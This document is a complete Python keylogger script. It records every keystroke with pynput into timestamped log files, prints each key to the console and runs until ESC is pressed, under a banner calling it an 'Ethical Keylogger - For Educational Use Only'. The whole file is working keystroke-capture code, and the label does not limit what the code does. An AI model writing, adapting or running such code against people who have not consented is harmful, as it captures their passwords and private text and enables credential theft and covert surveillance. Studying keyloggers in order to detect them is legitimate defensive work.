import pynput
import logging
import os
from datetime import datetime
from colorama import Fore, Style, init
from pynput.keyboard import Listener

# Initialize Colorama
init(autoreset=True)

# Create logs directory if not exists
if not os.path.exists("logs"):
    os.makedirs("logs")

# Generate a timestamped log file
log_filename = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(
    filename=log_filename,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
   _____ _                 _                  
  / ____| |               | |                 
 | (___ | | ___  _   _  __| | ___ _ __   __ _ 
  \___ \| |/ _ \| | | |/ _` |/ _ \ '_ \ / _` |
  ____) | | (_) | |_| | (_| |  __/ | | | (_| |
 |_____/|_|\___/ \__,_|\__,_|\___|_| |_|\__,_|

       🔹 Ethical Keylogger - For Educational Use Only 🔹
    """ + Style.RESET_ALL)

banner()

print(Fore.YELLOW + "[INFO] Keylogging started... (Press ESC to stop)")
print(Fore.GREEN + f"[LOG FILE] {log_filename}\n")

# Function to process keystrokes
def on_press(key):
    try:
        key_str = str(key).replace("'", "")
        print(Fore.BLUE + f"[KEY PRESSED] {key_str}")
        logging.info(f"Key Pressed: {key_str}")
    except Exception as e:
        print(Fore.RED + f"[ERROR] {e}")
        logging.error(f"Error: {e}")

# Function to stop logging
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        print(Fore.RED + "[INFO] Keylogging stopped. Check the log file for recorded keystrokes.")
        return False

# Start listening
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
